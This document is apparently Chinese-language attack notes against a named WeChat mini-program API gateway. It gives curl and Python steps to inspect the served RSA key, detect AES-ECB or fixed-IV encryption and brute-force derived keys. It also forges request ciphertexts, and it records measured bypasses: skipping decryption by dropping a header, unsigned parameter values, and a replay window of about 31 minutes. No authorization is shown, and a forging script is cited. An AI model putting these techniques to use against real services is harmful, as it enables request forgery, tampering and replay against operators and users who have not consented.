## 判定流程（4 步，前 3 步零请求）

### 1) 抓 /config，判断下发的到底是公钥还是私钥
```bash
curl -sk 'https://think.afunapp.com/config?appid=APPID'
# data.secret_key = {"mode":"gcm","key":"MIIBIjANBgkq...","version":3,"symmetric":"AES","asymmetric":"RSA"}
python3 -c "import base64;from cryptography.hazmat.primitives.serialization import load_der_public_key as L;
k=L(base64.b64decode(KEY));print(type(k).__name__,k.public_numbers().n.bit_length(),k.public_numbers().e)"
# → RSAPublicKey 2048 65537  ⇒ 只有 n,e（能加密、不能解密）
```
判据：`RSAPrivateKey`（含 d）才是大问题；`RSAPublicKey` 只能加密。

### 2) 密文形态统计，判断是否真为 RSA 混合 / GCM
从已捕获流量里抽出全部 `crypto_data`（query 或 form body，注意客户端是**双层 urlencode**，需 unquote 两次再 base64 解码）：
```python
raw = base64.b64decode(unquote(unquote(cd)) + '='*(-len(cd)%4))
len(raw) % 16            # 全 0 ⇒ 块密码+分组填充
len(set(ciphertexts)) / len(ciphertexts)   # 远小于 1 ⇒ 确定性（无随机 IV）
# 跨长度样本比首块：不同长度共享同一首块 ⇒ ECB / 固定 IV
```
判据表：
| 观察 | 结论 |
|---|---|
| 长度 ≡ 0 (mod 16)、跨请求确定性、不同长度共享首块 | **AES-ECB / 固定IV-CBC + 硬编码密钥**，公钥不参与 |
| 存在 256B 前缀且每次随机 | RSA 混合（可尝试第 3 步伪造） |
| 长度 = 明文+16、带 12B nonce | GCM |

### 3) 派生密钥穷举（判断密钥是否可从公开信息导出）
候选集：appid 原文/hex/MD5/SHA256、公钥 base64 头尾/MD5/SHA256、公钥 DER 的 MD5/SHA256、
app 名/域名/wxid 的 MD5+SHA256、常见弱 key（16/24/32 字节），×{ECB,CBC} 解已知密文，检查明文可打印且为 JSON。

### 4) 联网对照实验（决定性，2 次请求）
构造两份容器，只有 **RSA 段**不同：
```
A = base64( RSA_PKCS1v15(pub, K=random32) || IV(16) || AES-CBC(K[:16], IV, PKCS7(参数JSON)) )
C = base64( os.urandom(256)      || IV(16) || 同一份 AES 段 )
```
发送时 `quote(quote(v, safe=''), safe='')`（双层 urlencode，与客户端一致），带 `wxencryptversion: 3`。
- **A 与 C 响应相同** ⇒ RSA 段被忽略 ⇒ 公钥不参与加密 → 该路封死
- A 成功 / C 报解密错 ⇒ RSA 混合成立 ⇒ 可自造任意参数密文

## 通道旁路（本轮实测，跨同类网关可复用）
| 实验 | 结果 |
|---|---|
| **删掉 `wxencryptversion` 头**，body 仍为 `crypto_data=<b64>` | 服务端**跳过解密**，直接进签名校验（返回 601 而不是 WxDecrypt failed）⇒ 解密层非强制 |
| `wxencryptversion: 1` / `2` | `{"code":604,"message":"版本较低，需要升级版本"}`（老版本只在老主机 afunapp 域可用） |
| 长度不对齐（如 314B） | `{"code":100,"data":"解码错误02","message":"WxDecrypt failed"}` ⇒ 16 字节对齐是硬约束 |
| 追加明文参数名（`&uid=`） | `601 签名不正确` ⇒ **参数名进签名** |
| 只换参数值 | 越过签名（落在解密层）⇒ **参数值不进签名** |

## 真正的边界：签名时效锚
`sign` 是客户端 HMAC（16B base64），其时效锚 `signtime` = 服务端 `/config/get_sign` 返回的 `sign_time`，
而该端点**强制要求活的 wx.login code**：
```
GET /config/get_sign?platform=1                 -> {"code":100,"message":"参数错误"}
GET /config/get_sign?platform=1&code=<过期code>  -> {"code":100,"message":"获取session_key失败","data":"...errcode=40029"}
GET /config/get_sign?platform=1&code=<新code>    -> {"code":0,"data":{"sign":"<32hex>","sign_time":<ts>}}
```
⇒ 纯 HTTP 侧无法续期，重放窗口 = 服务端对 signtime 的容忍度（本目标实测 **1900s 成功 / 2100s 失败 ⇒ ≈31 分钟**）。
结论：这类网关的请求侧攻击必须**先把客户端跑起来**；任何纯 HTTP 复现 30 分钟后归零。

## 落盘脚本
`runs/qingteng/r10/forge.py`（analyze / forge 两个分支，可复跑）。